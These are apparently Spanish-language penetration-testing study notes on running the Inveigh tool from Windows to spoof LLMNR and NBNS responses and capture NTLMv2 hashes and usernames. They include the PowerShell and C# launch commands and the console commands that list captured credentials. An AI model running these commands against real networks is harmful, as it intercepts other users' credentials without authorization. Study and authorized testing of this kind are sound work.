
Desde Windows usaremos [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

## Inveigh descripcion general

[Inveigh](https://github.com/Kevin-Robertson/Inveigh): es similar a Responder pero escrita en PS o C#. Escucha por la red en varios protocolos, entre los que se incluye: DNS, LLMNR, mDNS, NBNS, DHCP, HTTP, ICMP, SMB, LDAP, WebDAV y Proxy Auth

[wiki de parametros](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)

## Usando Inveigh

1. Miramos los parametros

```
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```
![[Pasted image 20260925170509.png]]

2. Usamos Inveigh con suplantacion de LLMNR y NBNS y enviamos su salida a un archivo y por consola:

```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

## C# Inveigh (Inveigh Zero)

```
.\Inveigh.exe
```
![[Pasted image 20260925170722.png]]

	Como podemos ver, la herramienta se inicia y muestra qué opciones están habilitadas por defecto y cuáles no. Las opciones con un `[+]` son predeterminadas


Podemos presionar la tecla `esc` para entrar en la consola interactiva mientras Inveigh se está ejecutando.

```
ESC
```
![[Pasted image 20260925170826.png]]

Tras escribir HELP y dar a ENTER se nos presentan varias opciones:

```
HELP
```
![[Pasted image 20260925170906.png]]

Podemos ver rápidamente los hashes únicos capturados escribiendo `GET NTLMV2UNIQUE`

```
GET NTLMV2UNIQUE
```
![[Pasted image 20260925170923.png]]

Podemos escribir `GET NTLMV2USERNAMES` y ver qué nombres de usuario hemos recopilado

```
GET NTLMV2USERNAMES
```
![[Pasted image 20260925170938.png]]
